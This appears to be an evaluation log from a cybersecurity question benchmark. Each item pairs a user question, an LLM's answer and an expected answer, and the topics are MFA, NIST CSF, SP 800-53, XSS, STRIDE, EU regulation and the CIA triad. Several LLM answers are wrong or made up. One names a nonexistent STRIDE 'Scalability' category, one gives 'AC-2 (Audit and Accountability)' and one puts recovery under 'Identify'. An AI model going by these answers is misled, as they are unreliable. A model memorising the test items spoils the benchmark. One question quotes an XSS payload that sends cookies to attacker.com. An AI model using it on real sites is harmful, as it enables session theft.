SYSTEM PROMPT:
You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.

USER PROMPT:
Analyze the following statement: 'The system must enforce multi-factor authentication (MFA) for all administrative access.' In the context of cybersecurity, what type of statement is this and what is its primary purpose?

LLM RESPONSE:
This is a **security requirement statement**. Its primary purpose is to **enhance system security by requiring multiple forms of verification for administrative access**, significantly reducing the risk of unauthorized access and data breaches. It aims to prevent account compromise even if one authentication factor is stolen or bypassed.

EXPECTED SHORT ANSWER:
This statement is a security requirement. Its purpose is to define a specific functionality or constraint (MFA) to protect critical access.

SYSTEM PROMPT:
You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.

USER PROMPT:
A company experiences a ransomware attack. They activate their incident response plan to contain the damage and begin restoring systems from backups. According to the NIST Cybersecurity Framework (CSF), which two core functions are most prominently demonstrated by these actions?

LLM RESPONSE:
The two NIST CSF core functions most prominently demonstrated are:

*   **Identify:** Recognizing the ransomware attack and activating the incident response plan falls under identifying a cybersecurity event.
*   **Respond:** Containing the damage and restoring systems from backups are direct actions taken to respond to the identified threat.

EXPECTED SHORT ANSWER:
The primary functions demonstrated are 'Respond' (activating the incident plan) and 'Recover' (restoring from backups).

Category: Security Controls - Identification
Response Time: 16.10 seconds

SYSTEM PROMPT:
You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.

USER PROMPT:
A security policy mandates that 'all actions performed by privileged users, including logins and system changes, must be recorded in immutable, time-stamped log files.' Within the NIST SP 800-53 standard, which control family specifically addresses this type of requirement?

LLM RESPONSE:
The NIST SP 800-53 control family that specifically addresses this requirement is **AC (Access Control)**. 

Specifically, **AC-2 (Audit and Accountability)** within the AC family mandates the recording of privileged user actions in audit logs, including time-stamping and ensuring log integrity.

EXPECTED SHORT ANSWER:
This requirement is addressed by the 'AU' (Audit and Accountability) control family.

SYSTEM PROMPT:
You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.

USER PROMPT:
A web application has a comments section where user input is directly rendered back to the page without being sanitized. An attacker posts a comment containing '<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>'. What is the common name for this vulnerability and what is its corresponding CWE identifier?

LLM RESPONSE:
The common name for this vulnerability is **Cross-Site Scripting (XSS)**. 

Its corresponding CWE identifier is **CWE-79**.

EXPECTED SHORT ANSWER:
This vulnerability is known as Cross-Site Scripting (XSS). Its corresponding identifier is CWE-79.

Category: Threat Modeling - Classification
Response Time: 19.11 seconds

SYSTEM PROMPT:
You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.

USER PROMPT:
During a threat modeling exercise, a team identifies a risk where an unauthorized user could intercept and alter data packets being sent between a client and a server, changing the amount of a financial transaction. Within the STRIDE threat model, which category does this threat belong to?

LLM RESPONSE:
This threat primarily falls under the **Scalability** category of the STRIDE threat model. 

Specifically, it relates to **Spoofing** (as the attacker might spoof the sender or receiver) and **Manipulation** (altering the data). The core issue is the potential for unauthorized modification of data in transit, impacting the integrity of the system's scalability and reliability.

EXPECTED SHORT ANSWER:
This threat belongs to the 'Tampering' category of the STRIDE model, as it involves the unauthorized modification of data.

Response Time: 20.31 seconds

SYSTEM PROMPT:
You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.

USER PROMPT:
Consider two security incidents in the EU: 1) A nationwide power grid operator suffers a cyberattack that disrupts electricity distribution. 2) A social media company has a data breach exposing the personal messages of millions of users. Which regulation is the primary concern for incident 1, and which for incident 2?

LLM RESPONSE:
*   **Incident 1 (Power Grid):** The primary concern is the **NIS Directive (Network and Information Security Directive)**. This directive focuses on the security of critical infrastructure.
*   **Incident 2 (Social Media Data Breach):** The primary concern is the **GDPR (General Data Protection Regulation)**. This regulation governs the protection of personal data.

EXPECTED SHORT ANSWER:
Incident 1 (disruption of critical infrastructure) is primarily a concern for the NIS 2 Directive. Incident 2 (breach of personal data) is a primary concern for GDPR.

SYSTEM PROMPT:
You are a helpful assistant specialized in cybersecurity topics. Answer the user's question directly and concisely.

USER PROMPT:
A cloud storage service uses data checksums (like SHA-256 hashes) to verify that files have not been altered or corrupted during upload or download. Which principle of the CIA triad is primarily being upheld by this security control?

LLM RESPONSE:
**Integrity** is the principle of the CIA triad primarily upheld by using data checksums. Checksums ensure data hasn't been altered or corrupted.

EXPECTED SHORT ANSWER:
This control primarily upholds the principle of 'Integrity'.
